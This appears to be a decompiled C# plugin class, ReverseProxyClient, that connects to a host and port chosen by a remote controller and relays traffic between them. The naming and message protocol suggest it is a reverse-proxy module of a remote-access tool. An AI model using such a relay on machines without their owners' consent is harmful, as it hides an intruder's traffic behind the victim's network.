using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using Leb128;
using Plugin.Helper;

namespace Plugin.Sock5;

public class ReverseProxyClient
{
	public const int BUFFER_SIZE = 12000;

	private byte[] _buffer;

	private bool _disconnectIsSend;

	public Client Client;

	private Timer TimeOutTimer;

	private DateTime lastPing;

	public Socket Handle { get; private set; }

	public string Target { get; private set; }

	public int Port { get; private set; }

	public ReverseProxyClient(string Target, int Port, Client Client)
	{
		this.Target = Target;
		this.Port = Port;
		this.Client = Client;
		Handle = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
		Last();
		TimeOutTimer = new Timer(Check, null, 1, 5000);
		Handle.BeginConnect(Target, Port, Handle_Connect, null);
	}

	private void Handle_Connect(IAsyncResult ar)
	{
		try
		{
			Handle.EndConnect(ar);
		}
		catch
		{
		}
		if (Handle.Connected)
		{
			try
			{
				_buffer = new byte[12000];
				Handle.BeginReceive(_buffer, 0, _buffer.Length, SocketFlags.None, AsyncReceive, null);
			}
			catch
			{
				Client.Send(LEB128.Write(new object[3]
				{
					Plugin.TagProxy,
					"ConnectResponse",
					false
				}));
				Disconnect();
			}
			IPEndPoint iPEndPoint = (IPEndPoint)Handle.LocalEndPoint;
			Client.Send(LEB128.Write(new object[6]
			{
				Plugin.TagProxy,
				"ConnectResponse",
				true,
				iPEndPoint.Address.GetAddressBytes(),
				iPEndPoint.Port,
				Target
			}));
			Last();
		}
		else
		{
			Client.Send(LEB128.Write(new object[3]
			{
				Plugin.TagProxy,
				"ConnectResponse",
				false
			}));
			Last();
		}
	}

	private void AsyncReceive(IAsyncResult ar)
	{
		try
		{
			int num = Handle.EndReceive(ar);
			if (num <= 0)
			{
				Disconnect();
				return;
			}
			byte[] array = new byte[num];
			Array.Copy(_buffer, array, num);
			Client.Send(LEB128.Write(new object[3]
			{
				Plugin.TagProxy,
				"Data",
				array
			}));
			Last();
			Handle.BeginReceive(_buffer, 0, _buffer.Length, SocketFlags.None, AsyncReceive, null);
		}
		catch
		{
			Disconnect();
		}
	}

	public void Disconnect()
	{
		if (!_disconnectIsSend)
		{
			_disconnectIsSend = true;
			Client.Send(LEB128.Write(new object[2]
			{
				Plugin.TagProxy,
				"Disconnect"
			}));
		}
		try
		{
			TimeOutTimer?.Dispose();
			Client?.Disconnect();
			Handle.Close();
		}
		catch
		{
		}
	}

	public void SendToTargetServer(byte[] data)
	{
		try
		{
			Last();
			Handle.Send(data);
		}
		catch
		{
			Disconnect();
		}
	}

	private double DiffSeconds(DateTime startTime, DateTime endTime)
	{
		return Math.Abs(new TimeSpan(endTime.Ticks - startTime.Ticks).TotalSeconds);
	}

	private void Check(object obj)
	{
		if (DiffSeconds(lastPing, DateTime.Now) > 30.0)
		{
			Disconnect();
		}
	}

	public void Last()
	{
		lastPing = DateTime.Now;
	}
}
